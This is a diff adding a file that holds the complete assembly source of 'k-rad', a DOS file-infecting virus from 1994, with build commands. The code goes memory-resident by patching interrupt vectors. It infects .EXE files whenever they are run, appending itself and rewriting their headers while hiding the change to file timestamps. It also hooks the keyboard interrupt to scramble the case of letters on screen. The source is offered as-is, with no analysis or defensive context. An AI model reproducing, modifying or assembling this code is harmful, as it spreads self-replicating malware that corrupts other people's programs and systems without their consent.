@@ -1,0 +1,265 @@
+
+comment #
+                            Source code of k-rad
+
+                               by Evil Avatar
+#
+
+;===<K-RAD.ASM>============================================================
+;
+;       k-rad Virus
+;       (c) 1994 Evil Avatar
+;
+; TASM /M3 K-RAD
+; TLINK /X K-RAD
+; EXE2BIN K-RAD K-RAD.COM
+
+.model tiny
+.code
+org 0
+
+VLEN    equ (end_virus-k_rad)
+ID      equ 0d00dh
+VMEM    equ (end_virus-k_rad+15)/16+1
+VSIZEK  equ (end_virus-k_rad+1023)/1024
+
+;=====( Entry point for EXE files )========================================
+
+k_rad:  db 0b8h, 8ch, 0d3h, 15h, 33h, 75h, 72h, 0f9h, 0d4h, -1, 08ah, 0c4h
+        mov ah, 0bh
+        mov bx, ID
+        int 21h                         ;installation check
+        or bx, bx                       ;are we installed?
+        je no_install                   ;yes? exit then
+        push ds                         ;save PSP segment
+        mov ax, ds
+        dec ax                          ;get MCB segment
+        mov ds, ax                      ;put MCB segment into DS
+        sub di, di                      ;clear di for indexing
+        cmp byte ptr ds:[di], 'Z'       ;last MCB in chain?
+        jnz no_install                  ;no? don't go resident
+        sub word ptr ds:[di+3], VMEM    ;shrink host allocation
+        sub word ptr ds:[di+12h], VMEM  ;alter PSP memory size field
+        mov es, word ptr ds:[di+12h]    ;get new virus segment
+        call $+3
+        pop si
+        sub si, offset $-1              ;get a delta offset
+        mov cx, (heap-k_rad+1)/2        ;size of virus in words
+        rep movs word ptr es:[di], word ptr cs:[si]     ;copy virus
+        mov ds, cx                      ;get IVT/BIOS data area
+        sub byte ptr ds:[413h], VSIZEK  ;decrease total system memory
+        lds bx, dword ptr ds:[21h*4]    ;get int 21h address
+        mov word ptr es:[save21], bx
+        mov word ptr es:[save21+2], ds  ;save address
+        mov ds, cx
+        lds bx, dword ptr ds:[9h*4]     ;get int 9h address
+        mov word ptr es:[save9], bx
+        mov word ptr es:[save9+2], ds   ;save address
+        mov ds, cx
+        cli                             ;clear ints for IVT maipulation
+        mov word ptr ds:[21h*4], offset int21
+        mov word ptr ds:[21h*4+2], es   ;set new int 21h address
+        mov word ptr ds:[9h*4], offset int9
+        mov word ptr ds:[9h*4+2], es    ;set new int 9h address
+        sti                             ;restore ints
+        pop ds                          ;restore PSP segment
+        push ds
+        pop es
+no_install:
+        call delta
+delta:  pop bp                          ;get delta offset
+        mov ax, es                      ;get PSP segment
+        add ax, 10h                     ;adjust for PSP
+        add word ptr ss:[bp+cs_ip+2-delta], ax  ;new CS
+        add word ptr ss:[bp+ss_sp-delta], ax    ;new SS
+        cli                             ;clear ints for stack manipulation
+        mov sp, word ptr ss:[bp+ss_sp+2-delta]  ;set new SP
+        mov ss, word ptr ss:[bp+ss_sp-delta]    ;set new SS
+        sti                             ;restore ints
+        db 0eah
+cs_ip   dd 0fff00000h                   ;set new CS:IP
+ss_sp   dd ?
+
+;=====( Interrupt 21h handler )============================================
+
+int21:  cmp ah, 0bh
+        jne i0                          ;installation check
+        cmp bx, ID                      ;is it an installation check?
+        jne dos21                       ;go? let DOS handle it
+        sub bx, bx                      ;zero BX for logical or
+        iret                            ;return to caller
+i0:     cmp ax, 4b00h                   ;execute?
+        je infect                       ;totally /<-RaD!
+dos21:  jmp dword ptr cs:[save21]       ;jump to dos
+        db 'Made in the USA', 0         ;not an imported product
+
+;=====( Infection routine )================================================
+
+infect: push ax bx cx dx bp si di ds es ;save calling registers
+        cbw                             ;clear ax
+        mov ds, ax                      ;get IVT
+        cli                             ;clear ints for IVT manipulation
+        mov word ptr ds:[24h*4], offset int24
+        mov word ptr ds:[24h*4+2], cs   ;set new int 24 handler
+        sti                             ;restore ints
+        mov ah, 3dh
+        push es
+        pop ds
+        int 21h                         ;open file read/only
+        jc no_good                      ;can't open? abort
+        push ax                         ;save handle
+        mov bx, 1220h
+        xchg ax, bx
+        int 2fh
+        mov ax, 1216h
+        sub bx, bx
+        mov bl, byte ptr es:[di]
+        int 2fh                         ;get SFT for handle
+        push cs
+        pop ds bx                       ;restore handle
+        mov ah, 3fh
+        mov cx, 1ch
+        mov dx, offset buffer
+        int 21h                         ;read in header
+        xchg si, dx
+        lodsw
+        cmp ax, 'MZ'                    ;is it an .EXE?
+        je do_it                        ;yeah? attempt an infection
+        cmp ax, 'ZM'                    ;is it an screwy .EXE?
+        je do_it                        ;yeah? attempt to infect it
+done:   mov ah, 3eh
+        int 21h                         ;close file
+no_good:
+        pop es ds di si bp dx cx bx ax  ;restore calling registers
+        jmp dos21                       ;jump to dos
+do_it:  cmp word ptr ds:[si-2+12h], ID  ;check checksum for infection
+        je done                         ;infected? abort
+        cmp word ptr ds:[si-2+0ch], -1  ;requests maximum memory?
+        jne done                        ;no? can't infect it properly
+        cmp word ptr ds:[si-2+1ah], 0   ;is it an overlay?
+        jnz done                        ;yes? can't infect it properly
+        mov ax, 4202h
+        sub cx, cx
+        cwd
+        int 21h                         ;go to end of file
+        push bx es di ax dx cs          ;save registers
+        pop es
+        add word ptr ds:[si-2+0ah], VMEM-1      ;set new minimum memory
+        add ax, (heap-k_rad)
+        adc dx, 0
+        mov cx, 200h
+        div cx                          ;calculate pages in infected file
+        mov word ptr ds:[si], dx        ;put it in header
+        or dx, dx                       ;remainder?
+        jz no_remainder                 ;no? no adjustment necessary
+        inc ax                          ;round up
+no_remainder:
+        mov word ptr ds:[si-2+4], ax    ;save it
+        lea si, [si-2+14h]              ;pointer to old CS:IP
+        lea di, [cs_ip]
+        movsw
+        movsw                           ;save it
+        sub si, 0ah                     ;point to SS:SP
+        movsw
+        movsw                           ;save it
+        pop dx ax                       ;restore file size
+        mov cx, 10h                     ;all the below stuff calculates
+        div cx                          ;the new CS:IP/SS:SP
+        mov bx, word ptr ds:[si-0eh-4+8]
+        sub ax, bx
+        sbb dx, 0
+adjust_ip:                              ;make sure IP is less than 16
+        cmp dx, cx                      ;so SS can be in the same segment
+        jb fixed_ip
+        inc ax
+        sub dx, cx
+        jmp adjust_ip
+fixed_ip:
+        mov cx, ID                      ;this below stuff saves the new
+        lea di, [buffer+0eh]            ;CS:IP, SS:SP, and negative
+        stosw                           ;checksum
+        xchg ax, cx
+        stosw
+        stosw
+        xchg ax, dx
+        stosw
+        xchg ax, cx
+        stosw
+        pop di es bx                    ;restore handle and SFT
+        mov word ptr es:[di+2], 2       ;set to read/write
+        mov ah, 40h
+        mov cx, (heap-k_rad)
+        cwd
+        int 21h                         ;write virus to file
+        mov word ptr es:[di+15h], 0
+        mov word ptr es:[di+17h], 0     ;go to start of file
+        mov ah, 40h
+        mov cx, 1ch
+        lea dx, [buffer]
+        int 21h                         ;write new header
+        mov ax, 5701h
+        mov cx, word ptr es:[di+0dh]
+        mov dx, word ptr es:[di+0fh]
+        int 21h                         ;restore time/date
+        jmp done                        ;exit. done infecting
+
+;=====( Critical error handler )===========================================
+
+int24:  iret
+
+;=====( Interrupt 9h handler )=============================================
+
+int9:   push ax bx cx dx
+        mov ah, 0fh
+        int 10h                         ;get page number
+        mov ah, 3
+        int 10h                         ;get cursor position
+        mov ah, 2
+        dec dl
+        int 10h                         ;set position to previous character
+        mov ah, 8
+        int 10h                         ;get character
+        and al, 5fh                     ;make uppercase
+        cmp al, 41h                     ;check if it is a letter
+        jb no_change                    ;if not then exit
+        cmp al, 5ah
+        ja no_change
+        push ax                         ;save it
+        mov ah, 2
+        dec dl
+        int 10h                         ;set position to previous character
+        mov ah, 8
+        int 10h                         ;get character
+        cmp al, 41h                     ;is it uppercase?
+        jb no_fix                       ;no? make next character uppercase
+        cmp al, 5ah                     ;is it uppercase?
+        ja no_fix                       ;no? make next one uppercase
+fix:    pop ax                          ;restore old letter
+        add al, 20h                     ;make lowercase
+        jmp new_char
+no_fix: pop ax                          ;restore old letter
+new_char:
+        inc dl
+        mov ah, 2
+        int 10h                         ;move forward one character
+        mov ah, 0ah
+        mov cx, 1
+        int 10h                         ;write new letter
+no_change:
+        mov ah, 2
+        inc dl
+        int 10h                         ;restore old cursor position
+        pop dx cx bx ax                 ;restore used registers
+        jmp dword ptr cs:[save9]        ;jump to old int 9 handler
+
+;=====( Virus data area )==================================================
+
+virus   db '[k-rad]', 0
+author  db 'by Evil Avatar', 0
+heap:
+save21  dd ?
+save9   dd ?
+buffer  db 1ch dup (?)
+end_virus:
+
+end k_rad
